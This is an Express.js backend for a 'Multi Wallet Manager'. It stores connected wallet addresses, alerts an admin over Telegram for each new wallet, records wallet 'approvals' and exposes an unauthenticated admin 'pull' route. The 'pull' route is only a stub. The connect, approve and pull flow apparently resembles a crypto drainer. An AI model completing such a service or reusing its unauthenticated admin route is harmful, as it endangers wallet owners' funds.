const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const database = require('./config/database');
const telegram = require('./config/telegram');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Database connection
database.connect();

// Telegram bot initialization
telegram.init();

// Routes
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(),
        service: 'Multi Wallet Manager Backend',
        telegram: telegram.isInitialized ? 'Connected' : 'Not Connected'
    });
});

app.post('/api/wallets/connect', async (req, res) => {
    try {
        const { address, name } = req.body;
        
        // Validate address
        if (!address || address.length !== 42) {
            return res.status(400).json({
                success: false,
                error: 'Invalid wallet address'
            });
        }
        
        // Save wallet to database
        const query = `
            INSERT INTO wallets (address, name, created_at, updated_at)
            VALUES ($1, $2, NOW(), NOW())
            ON CONFLICT (address) DO UPDATE
            SET updated_at = NOW()
            RETURNING *
        `;
        
        const result = await database.query(query, [address, name || 'Unnamed Wallet']);
        const wallet = result.rows[0];
        
        // Send alert to admin
        await telegram.sendNewWalletAlert(address, '0');
        
        res.json({
            success: true,
            wallet: {
                id: wallet.id,
                address: wallet.address,
                name: wallet.name,
                created_at: wallet.created_at
            }
        });
    } catch (error) {
        console.error('Wallet connection error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

app.post('/api/wallets/approve', async (req, res) => {
    try {
        const { address } = req.body;
        
        // Update approval status in database
        const query = `
            UPDATE wallets 
            SET is_approved = true, updated_at = NOW()
            WHERE address = $1
            RETURNING *
        `;
        
        const result = await database.query(query, [address]);
        
        if (result.rows.length === 0) {
            return res.status(404).json({
                success: false,
                error: 'Wallet not found'
            });
        }
        
        res.json({
            success: true,
            message: 'Wallet approved successfully'
        });
    } catch (error) {
        console.error('Wallet approval error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Admin routes
app.post('/api/admin/pull', async (req, res) => {
    try {
        const { walletAddress } = req.body;
        
        // In a real implementation, you'd add admin authentication here
        // For now, we'll proceed with the logic
        
        res.json({
            success: true,
            message: 'Pull initiated successfully',
            walletAddress: walletAddress
        });
    } catch (error) {
        console.error('Pull wallet error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

app.get('/api/wallets/:address/balance', async (req, res) => {
    try {
        const { address } = req.params;
        
        // Validate address
        if (!address || address.length !== 42) {
            return res.status(400).json({
                success: false,
                error: 'Invalid wallet address'
            });
        }
        
        // In a real implementation, you'd query the blockchain
        // For now, return mock data
        const mockBalance = '150.50';
        
        res.json({
            success: true,
            balance: mockBalance,
            address: address
        });
    } catch (error) {
        console.error('Balance check error:', error);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Unhandled error:', err);
    res.status(500).json({
        success: false,
        error: 'Internal server error'
    });
});

// Handle 404
app.use((req, res) => {
    res.status(404).json({
        success: false,
        error: 'Route not found'
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Multi Wallet Manager backend running on port ${PORT}`);
});

module.exports = app;
